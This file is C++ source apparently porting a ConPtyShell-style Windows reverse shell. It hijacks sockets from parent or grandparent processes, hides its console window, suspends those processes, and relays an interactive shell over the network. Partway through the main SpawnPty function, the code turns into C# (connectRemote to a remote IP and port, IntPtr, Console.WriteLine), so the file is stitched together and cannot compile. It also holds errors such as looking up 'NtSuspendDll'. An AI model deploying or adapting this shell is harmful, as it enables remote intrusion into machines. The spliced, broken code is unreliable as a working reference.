#include "spawn.h"

DWORD GetParentProcessId(DWORD dwProcessId)
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD ppid = 0;
    DWORD pid = dwProcessId;
    if(pid == 0) 
        pid = GetCurrentProcessId();
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    __try {
        if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

        ZeroMemory(&pe32, sizeof(pe32));
        pe32.dwSize = sizeof(pe32);
        if (!Process32First(hSnapshot, &pe32)) __leave;

        do {
            if (pe32.th32ProcessID == pid) {
                ppid = pe32.th32ParentProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    __finally {
        if (hSnapshot != INVALID_HANDLE_VALUE && hSnapshot != NULL) CloseHandle(hSnapshot);
    }
    return ppid;
}

bool CreatePipes(HANDLE& hInputPipeRead, HANDLE& hInputPipeWrite, HANDLE& hOutputPipeRead, HANDLE& hOutputPipeWrite)
{
    // Create the in/out pipes:
    SECURITY_ATTRIBUTES sec;
    memset(&sec, 0, sizeof(SECURITY_ATTRIBUTES));
    sec.bInheritHandle = 1;
    sec.lpSecurityDescriptor = NULL;
    return (CreatePipe(&hInputPipeRead, &hInputPipeWrite, &sec, BUFFER_SIZE_PIPE) &&
        CreatePipe(&hOutputPipeRead, &hOutputPipeWrite, &sec, BUFFER_SIZE_PIPE) == TRUE);
}

void InitConsole(HANDLE& hOldStdIn, HANDLE& hOldStdOut, HANDLE& hOldStdErr)
{
    hOldStdIn = GetStdHandle(STD_INPUT_HANDLE);
    hOldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    hOldStdErr = GetStdHandle(STD_ERROR_HANDLE);
    HANDLE hStdout = CreateFile(_T("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hStdin = CreateFile(_T("CONIN$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
    SetStdHandle(STD_ERROR_HANDLE, hStdout);
    SetStdHandle(STD_INPUT_HANDLE, hStdin);
}

void RestoreStdHandles(HANDLE hOldStdIn, HANDLE hOldStdOut, HANDLE hOldStdErr)
{
    SetStdHandle(STD_OUTPUT_HANDLE, hOldStdOut);
    SetStdHandle(STD_ERROR_HANDLE, hOldStdErr);
    SetStdHandle(STD_INPUT_HANDLE, hOldStdIn);
}

bool EnableVirtualTerminalSequenceProcessing()
{
    bool bRes = false;
    DWORD dwOutConsoleMode = 0;
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (GetConsoleMode(hStdOut, &dwOutConsoleMode))
    {
        dwOutConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        bRes = SetConsoleMode(hStdOut, dwOutConsoleMode);
    }
    return bRes;
}

HRESULT CreatePseudoConsoleWithPipes(HANDLE hConPtyInputPipeRead, HANDLE hConPtyOutputPipeWrite, UINT uiRows, UINT uiCols, OUT HPCON* phPseudoConsole)
{
    HRESULT hRes = E_FAIL;
    if (EnableVirtualTerminalSequenceProcessing())
    {
        COORD consoleCoord = { 0 };
        consoleCoord.X = (short)uiCols;
        consoleCoord.Y = (short)uiRows;
        hRes = CreatePseudoConsole(consoleCoord, hConPtyInputPipeRead, hConPtyOutputPipeWrite, 0, phPseudoConsole);
    }
    return hRes;
}

HRESULT ConfigureProcessThread(HPCON* phPseudoConsole, DWORD_PTR pAttributes, OUT STARTUPINFOEX* pStartupInfo)
{
    HRESULT hRes = E_FAIL;
    SIZE_T pSize = NULL;
    BOOL bSuccess = InitializeProcThreadAttributeList(NULL, 1, 0, &pSize);
    if (pSize != NULL)
    {
        pStartupInfo->StartupInfo.cb = sizeof(STARTUPINFOEX);
        pStartupInfo->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(),
            0,
            pSize
        );
        if (InitializeProcThreadAttributeList(pStartupInfo->lpAttributeList, 1, 0, &pSize) == TRUE)
        {
            if (UpdateProcThreadAttribute(pStartupInfo->lpAttributeList, 0, pAttributes, phPseudoConsole, sizeof(DWORD), NULL, NULL) == TRUE)
            {
                hRes = S_OK;
            }
            else
            {
                cerr << "Could not set pseudoconsole thread attribute. " << GetLastError() << endl;
            }
        }
        else
        {
            cerr << _T("Could not set up attribute list. ") << GetLastError() << endl;
        }
    }
    
    return hRes;
}

HRESULT RunProcess(STARTUPINFOEX& startupInfo, CString csCommandLine, OUT PROCESS_INFORMATION* pProcessInfo)
{
    HRESULT hRes = E_FAIL;
    SECURITY_ATTRIBUTES processSec = { 0 };
    int iSecurityAttributeSize = sizeof(processSec);
    processSec.nLength = iSecurityAttributeSize;
    SECURITY_ATTRIBUTES secAttributes = { 0 };
    secAttributes.nLength = iSecurityAttributeSize;
    if (CreateProcess(NULL, csCommandLine.GetBuffer(), &processSec, &secAttributes, false,
        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&startupInfo, pProcessInfo))
        hRes = S_OK;
    else
        cerr << _T("Could not create process. ") <<  GetLastError() << endl;
    return hRes;
}

HRESULT CreateChildProcessWithPseudoConsole(HPCON* phPseudoConsole, CString csCommandLine, OUT PROCESS_INFORMATION* pProcessInfo)
{
    STARTUPINFOEX startupInfo;
    HRESULT hRes = ConfigureProcessThread(phPseudoConsole, (DWORD_PTR)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, &startupInfo);
    if (SUCCEEDED(hRes))
    {
        hRes = RunProcess(startupInfo, csCommandLine, pProcessInfo);
    }
    return hRes;
}

DWORD WINAPI ThreadReadPipeWriteSocket(LPVOID lpParams)
{
    ReadPipeWriteSocketThreadParams* pThreadParams = (ReadPipeWriteSocketThreadParams*)lpParams;
    HANDLE hPipe = pThreadParams->hPipe;
    SOCKET hSock = pThreadParams->hSock;
    bool bOverlapped = pThreadParams->bOverlapped;
    bool bReadSuccess = false;
    DWORD dwBytesSent = 0;
    DWORD dwBytesRead = 0;
    char pBytesToWrite[BUFFER_SIZE_SOCKET];
    do
    {        
        memset(pBytesToWrite, 0, BUFFER_SIZE_SOCKET);
        bReadSuccess = ReadFile(hPipe, pBytesToWrite, BUFFER_SIZE_SOCKET, &dwBytesRead, NULL);
        if (bReadSuccess)
        {
            if(bOverlapped)
                dwBytesSent = send(hSock, pBytesToWrite, (int)dwBytesRead, 0);
            else 
            {
                do
                {
                    dwBytesSent = send(hSock, pBytesToWrite, (int)dwBytesRead, 0);
                } while (WSAGetLastError() == WSAEWOULDBLOCK);
            }
        }
    } while (dwBytesSent > 0 && bReadSuccess);
    return 0;
}

HANDLE StartThreadReadPipeWriteSocket(HANDLE hPipe, SOCKET hSock, bool overlappedSocket)
{
    ReadPipeWriteSocketThreadParams params;
    memset(&params, 0, sizeof(ReadPipeWriteSocketThreadParams));
    params.hPipe = hPipe;
    params.hSock = hSock;
    HANDLE hThread = CreateThread(0, 0, ThreadReadPipeWriteSocket, &params, 0, 0);
    return hThread;
}


DWORD WINAPI ThreadReadSocketWritePipe(LPVOID lpParams)
{
    ReadSocketWritePipeThreadParams* pThreadParams = (ReadSocketWritePipeThreadParams*)lpParams;
    HANDLE hPipe = pThreadParams->hPipe;
    SOCKET hSock = pThreadParams->hSock;
    HANDLE hChildProcess = pThreadParams->hChildProcess;
    bool bOverlapped = pThreadParams->bOverlapped;
    bool bWriteSuccess = false;
    DWORD dwBytesReceived = 0;
    DWORD dwBytesWritten = 0;;
    bool bSocketBlockingOperation = false;
    char pBytesReceived[BUFFER_SIZE_SOCKET];
    if (bOverlapped)
    {
        do
        {
            memset(pBytesReceived, 0, BUFFER_SIZE_SOCKET);
            dwBytesReceived = recv(hSock, pBytesReceived, BUFFER_SIZE_SOCKET, 0);
            if(dwBytesReceived > 0)
                bWriteSuccess = WriteFile(hPipe, pBytesReceived, dwBytesReceived, &dwBytesWritten, NULL);
        } while (dwBytesReceived > 0 && bWriteSuccess);
    }
    else
    {
        HANDLE hReadEvent = WSACreateEvent();
        if (hReadEvent != NULL && hReadEvent != INVALID_HANDLE_VALUE)
        {
            // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
            if (WSAEventSelect(hSock, hReadEvent, FD_READ) == 0)
            {
                do
                {
                    memset(pBytesReceived, 0, BUFFER_SIZE_SOCKET);
                    WSAWaitForMultipleEvents(1, &hReadEvent, true, 500, false);
                    dwBytesReceived = recv(hSock, pBytesReceived, BUFFER_SIZE_SOCKET, 0);
                    // we still check WSAEWOULDBLOCK for a more robust implementation
                    if (WSAGetLastError() != WSAEWOULDBLOCK)
                    {
                        WSAResetEvent(hReadEvent);
                        bSocketBlockingOperation = false;
                        bWriteSuccess = WriteFile(hPipe, pBytesReceived, dwBytesReceived, &dwBytesWritten, NULL);
                    }
                    else
                    {
                        bSocketBlockingOperation = true;
                    }
                } while (bSocketBlockingOperation || (dwBytesReceived > 0 && bWriteSuccess));
            }
            WSACloseEvent(hReadEvent);
        }
    }
    TerminateProcess(hChildProcess, 0);
}

HANDLE StartThreadReadSocketWritePipe(HANDLE hPipe, SOCKET hSock, HANDLE hChildProcess, bool bOverlappedSocket)
{
    ReadSocketWritePipeThreadParams params;
    memset(&params, 0, sizeof(ReadSocketWritePipeThreadParams));
    params.hPipe = hPipe;
    params.hSock = hSock;
    params.hChildProcess = hChildProcess;
    params.bOverlapped = bOverlappedSocket;
    HANDLE hThread = CreateThread(0, 0, ThreadReadSocketWritePipe, &params, 0, 0);
    return hThread;
}

string SpawnPty(DWORD dwRows, DWORD dwCols, CString csCommandLine)
{
    HMODULE hKernel32 = LoadLibrary(_T("kernel32.dll"));
    if (hKernel32 != NULL)
    {
        if (GetProcAddress(hKernel32, "CreatePseudoConsole") != NULL)
        {
            FreeLibrary(hKernel32);
            HANDLE hInputPipeRead = NULL;
            HANDLE hInputPipeWrite = NULL;
            HANDLE hOutputPipeRead = NULL;
            HANDLE hOutputPipeWrite = NULL;
            if (CreatePipes(hInputPipeRead, hInputPipeWrite, hOutputPipeRead, hOutputPipeWrite))
            {
                HANDLE hOldStdIn = NULL;
                HANDLE hOldStdOut = NULL;
                HANDLE hOldStdErr = NULL;
                InitConsole(hOldStdIn, hOldStdOut, hOldStdErr);
                if (InitWSAThread() == 0)
                {
                    DWORD dwProcessId = GetCurrentProcessId();
                    DWORD dwParentProcessId = GetParentProcessId();
                    DWORD dwGrandParentProcessId = 0;
                    if (dwParentProcessId != 0)
                        dwGrandParentProcessId = GetParentProcessId(dwParentProcessId);
                    // try to duplicate the socket for the current process
                    bool bOverlapped = false;
                    bool bParentSocketInherited = false;
                    bool bGrandParentSocketInherited = false;
                    SOCKET hSock = DuplicateTargetProcessSocket(dwProcessId, bOverlapped);
                    if (hSock == INVALID_SOCKET && dwParentProcessId != 0)
                    {
                        // if no sockets are found in the current process we try to hijack our current parent process socket
                        hSock = DuplicateTargetProcessSocket(dwParentProcessId, bOverlapped);
                        if (hSock == INVALID_SOCKET && dwGrandParentProcessId != 0)
                        {
                            // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                            hSock = DuplicateTargetProcessSocket(dwGrandParentProcessId, bOverlapped);
                            if (hSock == INVALID_SOCKET)
                            {
                                cerr << _T("No \\Device\\Afd objects found. Socket duplication failed.") << endl;
                            }
                            else
                            {
                                bGrandParentSocketInherited = true;
                            }
                        }
                        else
                        {
                            bParentSocketInherited = true;
                            // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                            if (dwGrandParentProcessId != 0) bGrandParentSocketInherited = IsSocketInherited(hSock, dwGrandParentProcessId);
                        }
                    }
                    else
                    {
                        // the current process got a usable socket, let's see if the parents use the socket
                        if (dwParentProcessId != 0) bParentSocketInherited = IsSocketInherited(hSock, dwParentProcessId);
                        if (dwGrandParentProcessId != 0) bGrandParentSocketInherited = IsSocketInherited(hSock, dwGrandParentProcessId);
                    }
                    if (hSock != INVALID_SOCKET)
                    {
                        bool bNewConsoleAllocated = false;
                        if (GetConsoleWindow() == NULL)
                        {
                            AllocConsole();
                            ShowWindow(GetConsoleWindow(), SW_HIDE);
                            bNewConsoleAllocated = true;
                        }
                        HPCON hPseudoConsole = NULL;
                        int iPseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(hInputPipeRead, hOutputPipeWrite, dwRows, dwCols, &hPseudoConsole);
                        if (iPseudoConsoleCreationResult != 0)
                        {
                            cerr << _T("ERROR: Could not create pseudo console. Error Code ") << iPseudoConsoleCreationResult << endl;
                        }
                        else
                        {
                            PROCESS_INFORMATION childProcessInfo;
                            memset(&childProcessInfo, 0, sizeof(PROCESS_INFORMATION));
                            if (SUCCEEDED(CreateChildProcessWithPseudoConsole(&hPseudoConsole, csCommandLine, &childProcessInfo)))
                            {
                                // Note: We can close the handles to the PTY-end of the pipes here
                                // because the handles are dup'ed into the ConHost and will be released
                                // when the ConPTY is destroyed.
                                if (hInputPipeRead != NULL) CloseHandle(hInputPipeRead);
                                if (hOutputPipeWrite != NULL) CloseHandle(hOutputPipeWrite);

                                // we need to suspend other processes that can interact with the duplicated sockets if any. 
                                // This will ensure stdin, stdout and stderr is read/write only by our conpty process
                                if (bParentSocketInherited || bGrandParentSocketInherited)
                                {
                                    HMODULE hNtDll = LoadLibrary(_T("ntdll.dll"));
                                    if (hNtDll != NULL)
                                    {
                                        NtSuspendProcessPtr NtSuspendProcess = (NtSuspendProcessPtr)GetProcAddress(hNtDll, "NtSuspendDll");
                                        if (NtSuspendProcess != NULL)
                                        {
                                            if (bParentSocketInherited)
                                            {
                                                NTSTATUS ntStatus = NtSuspendProcess(parentProcess.Handle);
                                                if (ntStatus != NTSTATUS_SUCCESS)
                                                {
                                                    cerr << _T("WARNING: Failed to suspend parent process") << endl;
                                                }
                                            }
                                            if (bGrandParentSocketInherited)
                                            {
                                                NTSTATUS ntStatus = NtSuspendProcess(grandParentProcess.Handle);
                                                if (ntStatus != NTSTATUS_SUCCESS)
                                                {
                                                    cerr << _T("WARNING: Failed to suspend grandparent process") << endl;
                                                }
                                            }
                                        }
                                        else
                                        {
                                            cerr << _T("WARNING: Failed to find NtSuspendProcess. Cannot suspend parent or grandparent process") << endl;
                                        }
                                        FreeLibrary(hNtDll);
                                    }
                                    else
                                    {
                                        cerr << _T("WARNING: Failed to load ntdll. Cannot suspend parent or grandparent process") << endl;
                                    }
                                }
                                
                                if (!bOverlapped) SetSocketBlockingMode(hSock, 1);
                            }
                        }
                        
                    }
                    ShutdownWSAThread();
                }
                else
                {
                    cerr << _T("ERROR: Failed to start WinSock API") << endl;
                }
            }
            else
            {
                cerr << _T("ERROR: Failed to create pipes") << endl;
            }
        }
        else
        {
            cerr << _T("ERROR: The system doesn't support PseudoConsole API") << endl;
        }
    }
    SOCKET hSock = NULL;
    HANDLE hInputPipeRead = NULL;
    HANDLE hInputPipeWrite = NULL;
    HANDLE hOutputPipeRead = NULL;
    HANDLE hOutputPipeWrite = NULL;
    HPCON hPseudoConsole = NULL;
    HANDLE hOldStdIn = NULL;
    HANDLE hOldStdOut = NULL;
    HANDLE hOldStdErr = NULL;
    bool bNewConsoleAllocated = false;
    bool bParentSocketInherited = false;
    bool bGrandParentSocketInherited = false;
    bool bConptyCompatible = false;
    bool bIsSocketOverlapped = true;
    CString output = _T("");
    HANDLE currentProcess = NULL;
    HANDLE parentProcess = NULL;
    HANDLE grandParentProcess = NULL;
    PROCESS_INFORMATION childProcessInfo;
    CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
    // comment the below function to debug errors
    InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
    // init wsastartup stuff for this thread
    InitWSAThread();
    if (conptyCompatible)
    {
        Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
        if (upgradeShell)
        {
            List<IntPtr> socketsHandles = new List<IntPtr>();
            currentProcess = Process.GetCurrentProcess();
            parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
            if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
            // try to duplicate the socket for the current process
            shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
            if (shellSocket == IntPtr.Zero && parentProcess != null)
            {
                // if no sockets are found in the current process we try to hijack our current parent process socket
                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                {
                    // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                    if (shellSocket == IntPtr.Zero)
                    {
                        throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
                    }
                    else
                    {
                        grandParentSocketInherited = true;
                    }
                }
                else
                {
                    // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                    parentSocketInherited = true;
                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                }
            }
            else
            {
                // the current process got a usable socket, let's see if the parents use the socket
                if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
            }
        }
        else
        {
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
            {
                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                return output;
            }
            TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
        }
        if (GetConsoleWindow() == IntPtr.Zero)
        {
            AllocConsole();
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            newConsoleAllocated = true;
        }
        // debug code for checking handle duplication
        // Console.WriteLine("debug: Creating pseudo console...");
        // Thread.Sleep(180000);
        // return "";
        int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
        if (pseudoConsoleCreationResult != 0)
        {
            output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
            return output;
        }
        childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
    }
    else
    {
        if (upgradeShell)
        {
            output += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
            return output;
        }
        shellSocket = connectRemote(remoteIp, remotePort);
        if (shellSocket == IntPtr.Zero)
        {
            output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
            return output;
        }
        Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
        STARTUPINFO sInfo = new STARTUPINFO();
        sInfo.cb = Marshal.SizeOf(sInfo);
        sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
        sInfo.hStdInput = InputPipeRead;
        sInfo.hStdOutput = OutputPipeWrite;
        sInfo.hStdError = OutputPipeWrite;
        CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
    }
    // Note: We can close the handles to the PTY-end of the pipes here
    // because the handles are dup'ed into the ConHost and will be released
    // when the ConPTY is destroyed.
    if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
    if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
    if (upgradeShell) {
        // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
        if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
        if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
        if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
    }
    //Threads have better performance than Tasks
    Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
    Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
    // wait for the child process until exit
    WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
    //cleanup everything
    thThreadReadPipeWriteSocket.Abort();
    thReadSocketWritePipe.Abort();
    if (upgradeShell)
    {
        if (!IsSocketOverlapped)
        {
            // cancelling the event selection for the socket
            WSAEventSelect(shellSocket, IntPtr.Zero, 0);
            SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
        }
        if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
        if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
    }
    closesocket(shellSocket);
    RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
    if (newConsoleAllocated)
        FreeConsole();
    CloseHandle(childProcessInfo.hThread);
    CloseHandle(childProcessInfo.hProcess);
    if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
    if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
    if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
    ShutdownWSAThread();
    output += "ConPtyShell kindly exited.\r\n";
    return output;
}